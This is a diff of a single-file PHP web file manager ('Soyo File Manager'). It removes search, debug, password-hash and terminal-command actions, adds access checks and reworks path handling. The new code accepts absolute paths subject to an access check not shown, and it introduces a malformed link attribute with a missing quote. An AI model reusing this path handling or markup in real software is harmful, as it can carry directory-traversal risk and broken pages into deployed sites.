                 $isZipFile = !$isDir && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip';
                 $isEditable = !$isDir && isEditable($file);
                 $isViewable = !$isDir && isViewable($file);
@@ -1246,7 +1028,7 @@ function showFileManager($currentPath, $relativePath) {
                         <?php elseif ($isEditable): ?>
                             <a href="?action=edit&path=<?php echo urlencode($fileRelativePath); ?>"><?php echo htmlspecialchars($file); ?></a>
                         <?php elseif ($isViewable): ?>
-                            <a href="?action=view&path=<?php echo urlencode($fileRelativePath); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a>
+                            <a href="?action=view&path=<?php echo urlencode($fileRelativePath); ?> target="_blank"><?php echo htmlspecialchars($file); ?></a>
                         <?php else: ?>
                             <span><?php echo htmlspecialchars($file); ?></span>
                         <?php endif; ?>
@@ -1291,6 +1073,11 @@ function showFileManager($currentPath, $relativePath) {
 }
 
 function showEditor($filePath) {
+    if (!canAccessPath($filePath)) {
+        echo "<h1>Access Denied</h1><p>You don't have permission to access this file.</p>";
+        return;
+    }
+    
     $content = file_get_contents($filePath);
     $fileName = basename($filePath);
     $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
@@ -1354,153 +1141,12 @@ function showEditor($filePath) {
     <?php
 }
 
-function showSearchResults() {
-    global $config;
-    
-    $filenameQuery = $_GET['filename'] ?? '';
-    $contentQuery = $_GET['content'] ?? '';
-    $filenameType = $_GET['filename_type'] ?? 'contain';
-    $contentType = $_GET['content_type'] ?? 'contain';
-    
-    if (empty($filenameQuery) && empty($contentQuery)) {
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    }
-    
-    try {
-        $searchResults = performFileSearch($config['root_path'], $filenameQuery, $contentQuery, $filenameType, $contentType);
-    } catch (Exception $e) {
-        showSearchError($e->getMessage(), $filenameQuery, $contentQuery);
-        exit;
-    }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Search Results - Soyo File Manager</title>
-        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/search-results.css'); ?>">
-    </head>
-    <body>
-        <div class="header">
-            <h1>🔍 Search Results</h1>
-            <div>
-                <a href="?action=debug_search&filename=<?php echo urlencode($filenameQuery); ?>&content=<?php echo urlencode($contentQuery); ?>" style="margin-right: 15px;">🐛 Debug</a>
-                <a href="?">🏠 Back to Soyo File Manager</a>
-            </div>
-        </div>
-        
-        <div class="search-info">
-            <h2>Search Results</h2>
-            <div class="search-criteria">
-                <?php if ($filenameQuery): ?>
-                <div>Filename (<strong><?php echo ucfirst($filenameType); ?></strong>): <strong><?php echo htmlspecialchars($filenameQuery); ?></strong></div>
-                <?php endif; ?>
-                <?php if ($contentQuery): ?>
-                <div>Content (<strong><?php echo ucfirst($contentType); ?></strong>): <strong><?php echo htmlspecialchars($contentQuery); ?></strong></div>
-                <?php endif; ?>
-            </div>
-            <div class="results-count">Found <?php echo count($searchResults); ?> matching files</div>
-        </div>
-        
-        <div class="search-form-results">
-            <div class="search-group">
-                <label>Search by Filename:</label>
-                <div class="search-input-group">
-                    <select id="filename-type-results" class="search-select">
-                        <option value="contain" <?php echo $filenameType === 'contain' ? 'selected' : ''; ?>>Contains</option>
-                        <option value="start" <?php echo $filenameType === 'start' ? 'selected' : ''; ?>>Starts with</option>
-                        <option value="end" <?php echo $filenameType === 'end' ? 'selected' : ''; ?>>Ends with</option>
-                        <option value="equal" <?php echo $filenameType === 'equal' ? 'selected' : ''; ?>>Exact match</option>
-                        <option value="wildcard" <?php echo $filenameType === 'wildcard' ? 'selected' : ''; ?>>Wildcard (*?)</option>
-                    </select>
-                    <input type="text" id="filename-search-results" placeholder="e.g., *.php, config, index.html" value="<?php echo htmlspecialchars($filenameQuery); ?>" />
-                </div>
-            </div>
-            <div class="search-group">
-                <label>Search by Content:</label>
-                <div class="search-input-group">
-                    <select id="content-type-results" class="search-select">
-                        <option value="contain" <?php echo $contentType === 'contain' ? 'selected' : ''; ?>>Contains</option>
-                        <option value="start" <?php echo $contentType === 'start' ? 'selected' : ''; ?>>Starts with</option>
-                        <option value="end" <?php echo $contentType === 'end' ? 'selected' : ''; ?>>Ends with</option>
-                        <option value="equal" <?php echo $contentType === 'equal' ? 'selected' : ''; ?>>Exact match</option>
-                        <option value="wildcard" <?php echo $contentType === 'wildcard' ? 'selected' : ''; ?>>Wildcard (*?)</option>
-                    </select>
-                    <input type="text" id="content-search-results" placeholder="e.g., function, &lt;?php, TODO" value="<?php echo htmlspecialchars($contentQuery); ?>" />
-                </div>
-            </div>
-            <div class="search-buttons">
-                <button type="button" class="search-btn" onclick="performSearchResults()">🔍 Search Again</button>
-                <button type="button" class="clear-btn" onclick="clearSearch()">🗑️ Clear</button>
-            </div>
-        </div>
-        
-        <div id="bulk-actions-search" class="bulk-actions-search">
-            ⚠️ Bulk Delete Selected Files:
-            <button onclick="bulkDeleteSearch()">🗑️ Delete Selected Files</button>
-        </div>
-        
-        <div class="search-results">
-            <?php if (empty($searchResults)): ?>
-                <div class="no-results">
-                    <div class="icon">🔍</div>
-                    <div>No files found matching your search criteria</div>
-                    <div style="margin-top: 15px; font-size: 12px;">
-                        <a href="?action=debug_search&filename=<?php echo urlencode($filenameQuery); ?>&content=<?php echo urlencode($contentQuery); ?>" style="color: #6366f1;">🐛 Debug Search</a>
-                    </div>
-                </div>
-            <?php else: ?>
-                <div class="search-results-header">
-                    <div class="result-checkbox">
-                        <input type="checkbox" id="select-all-search" onchange="selectAllSearch()">
-                    </div>
-                    <div class="result-icon">Type</div>
-                    <div class="result-path">File Path</div>
-                    <div class="result-match">Match Type</div>
-                    <div class="result-size">Size</div>
-                    <div class="result-actions">Actions</div>
-                </div>
-                
-                <?php foreach ($searchResults as $result): ?>
-                    <div class="search-result-item">
-                        <div class="result-checkbox">
-                            <input type="checkbox" value="<?php echo htmlspecialchars($result['relative_path']); ?>" onchange="toggleBulkActionsSearch()">
-                        </div>
-                        <div class="result-icon"><?php echo $result['icon']; ?></div>
-                        <div class="result-path">
-                            <?php if ($result['is_editable']): ?>
-                                <a href="?action=edit&path=<?php echo urlencode($result['relative_path']); ?>"><?php echo htmlspecialchars($result['filename']); ?></a>
-                            <?php else: ?>
-                                <span><?php echo htmlspecialchars($result['filename']); ?></span>
-                            <?php endif; ?>
-                            <div class="path-info"><?php echo htmlspecialchars($result['directory']); ?></div>
-                        </div>
-                        <div class="result-match">
-                            <span class="match-type match-<?php echo $result['match_type']; ?>">
-                                <?php echo ucfirst($result['match_type']); ?>
-                            </span>
-                        </div>
-                        <div class="result-size"><?php echo $result['size']; ?></div>
-                        <div class="result-actions">
-                            <?php if ($result['is_editable']): ?>
-                                <a href="?action=edit&path=<?php echo urlencode($result['relative_path']); ?>" class="action-btn edit-btn">✏️ Edit</a>
-                            <?php endif; ?>
-                            <a href="?action=delete&path=<?php echo urlencode($result['relative_path']); ?>" 
-                               onclick="return confirmDeleteSingle('<?php echo htmlspecialchars($result['filename']); ?>')" 
-                               class="action-btn delete-btn">🗑️ Delete</a>
-                        </div>
-                    </div>
-                <?php endforeach; ?>
-            <?php endif; ?>
-        </div>
-        
-        <script src="<?php echo getAssetUrl('assets/js/search.js'); ?>"></script>
-    </body>
-    </html>
-    <?php
-}
-
 function showPermissionEditor($filePath) {
+    if (!canAccessPath($filePath)) {
+        echo "<h1>Access Denied</h1><p>You don't have permission to access this file.</p>";
+        return;
+    }
+    
     $currentPermissions = substr(sprintf('%o', fileperms($filePath)), -4);
     $fileName = basename($filePath);
     ?>
@@ -1542,43 +1188,6 @@ function showPermissionEditor($filePath) {
     <?php
 }
 
-function showSearchError($message, $filenameQuery, $contentQuery) {
-    echo '<!DOCTYPE html>
-    <html>
-    <head>
-        <title>Search Error - Soyo File Manager</title>
-        <style>
-            body {
-                font-family: sans-serif;
-                background-color: #f4f4f4;
-                color: #333;
-                padding: 20px;
-            }
-            .error-message {
-                background-color: #fff;
-                border: 1px solid #ddd;
-                padding: 15px;
-                margin-bottom: 20px;
-                border-radius: 4px;
-                color: red;
-            }
-            h1 {
-                color: #555;
-            }
-        </style>
-    </head>
-    <body>
-        <h1>Search Error</h1>
-        <div class="error-message">
-            <p><strong>Error:</strong> ' . htmlspecialchars($message) . '</p>
-            <p><strong>Filename Query:</strong> ' . htmlspecialchars($filenameQuery) . '</p>
-            <p><strong>Content Query:</strong> ' . htmlspecialchars($contentQuery) . '</p>
-            <p><a href="javascript:history.back()">Go Back</a></p>
-        </div>
-    </body>
-    </html>';
-}
-
 // ==================== MAIN EXECUTION ====================
 
 // Authentication
@@ -1599,108 +1208,103 @@ if (isset($_GET['logout'])) {
     exit;
 }
 
-// Handle actions - FIXED PATH HANDLING
+// Handle actions with enhanced path handling
 $action = $_GET['action'] ?? '';
-$path = $_GET['path'] ?? '';
+$currentPath = getCurrentPath();
+$relativePath = getRelativePath($currentPath);
 
-// Simplified path handling like the working version
-$fullPath = realpath($config['root_path'] . '/' . $path);
-
-// Security check
-if (!$fullPath || !startsWith($fullPath, realpath($config['root_path']))) {
-    $fullPath = realpath($config['root_path']);
-    $path = '';
+// Get file path for file-specific actions
+$filePath = $currentPath;
+if ($action !== '' && isset($_GET['path'])) {
+    $requestedPath = $_GET['path'];
+    
+    // Handle both relative and absolute paths
+    if (strpos($requestedPath, '/') === 0) {
+        $filePath = realpath($requestedPath);
+    } else {
+        $uploadPath = realpath($config['upload_path']);
+        $uploadParent = dirname($uploadPath);
+        
+        // Cek apakah ini sibling directory
+        $possibleSibling = realpath($uploadParent . '/' . $requestedPath);
+        $possibleRelative = realpath($uploadPath . '/' . $requestedPath);
+        
+        if ($possibleSibling && file_exists($possibleSibling) && $possibleSibling !== $uploadPath) {
+            $filePath = $possibleSibling;
+        } elseif ($possibleRelative && file_exists($possibleRelative)) {
+            $filePath = $possibleRelative;
+        } else {
+            $filePath = false;
+        }
+    }
+    
+    // Security check
+    if (!$filePath || !canAccessPath($filePath)) {
+        $filePath = $currentPath;
+    }
 }
 
 switch ($action) {
     case 'view':
-        viewFile($fullPath);
+        viewFile($filePath);
         break;
     case 'download':
-        downloadFile($fullPath);
+        downloadFile($filePath);
         break;
     case 'delete':
-        deleteFile($fullPath);
+        deleteFile($filePath);
         break;
     case 'upload':
-        uploadFiles($fullPath);
+        uploadFiles($currentPath);
         break;
     case 'create_folder':
-        createFolder($fullPath, $_POST['folder_name'] ?? '');
+        createFolder($currentPath, $_POST['folder_name'] ?? '');
         break;
     case 'edit':
         if ($_POST) {
-            saveFile($fullPath, $_POST['content']);
+            saveFile($filePath, $_POST['content']);
         } else {
-            showEditor($fullPath);
+            showEditor($filePath);
             exit;
         }
         break;
     case 'edit_permissions':
         if ($_POST) {
-            changePermissions($fullPath, $_POST['permissions']);
+            changePermissions($filePath, $_POST['permissions']);
         } else {
-            showPermissionEditor($fullPath);
+            showPermissionEditor($filePath);
             exit;
         }
         break;
     case 'compress':
-        compressFiles($fullPath, $_POST['files'] ?? [], $_POST['archive_name'] ?? '');
+        compressFiles($currentPath, $_POST['files'] ?? [], $_POST['archive_name'] ?? '');
         break;
     case 'extract':
-        extractFile($fullPath);
+        extractFile($filePath);
         break;
     case 'create_file':
         if ($_POST) {
-            createFile($fullPath, $_POST['file_name'] ?? '', $_POST['file_content'] ?? '');
-        } else {
-            showFileCreator($fullPath);
-            exit;
+            createFile($currentPath, $_POST['file_name'] ?? '', $_POST['file_content'] ?? '');
         }
         break;
     case 'copy':
-        copyToClipboard($fullPath);
+        copyToClipboard($filePath);
         break;
     case 'paste':
-        pasteFromClipboard($fullPath);
-        break;
-    case 'search':
-        showSearchResults();
-        exit;
+        pasteFromClipboard($currentPath);
         break;
     case 'bulk_delete':
-        bulkDeleteFiles($_POST['files'] ?? [], $fullPath);
+        bulkDeleteFiles($_POST['files'] ?? [], $currentPath);
         break;
     case 'bulk_copy':
-        bulkCopyFiles($_POST['files'] ?? [], $fullPath);
-        break;
-    case 'bulk_delete_search':
-        bulkDeleteSearchResults($_POST['files'] ?? []);
-        break;
-    case 'debug_search':
-        debugSearch();
-        exit;
-        break;
-    case 'generate_hash':
-        if (isset($_POST['new_password'])) {
-            echo '<pre>New password hash: ' . generatePasswordHash($_POST['new_password']) . '</pre>';
-            exit;
-        }
+        bulkCopyFiles($_POST['files'] ?? [], $currentPath);
         break;
     case 'clear_clipboard':
         unset($_SESSION['clipboard']);
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
-        break;
-    case 'terminal':
-        runTerminalCommand($fullPath);
-        exit;
-        break;
-    case 'get_folders':
-        getFolderList();
-        exit;
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
         break;
 }
 
 // Main interface
-showFileManager($fullPath, $path);
+showFileManager($currentPath, $relativePath);
 ?>
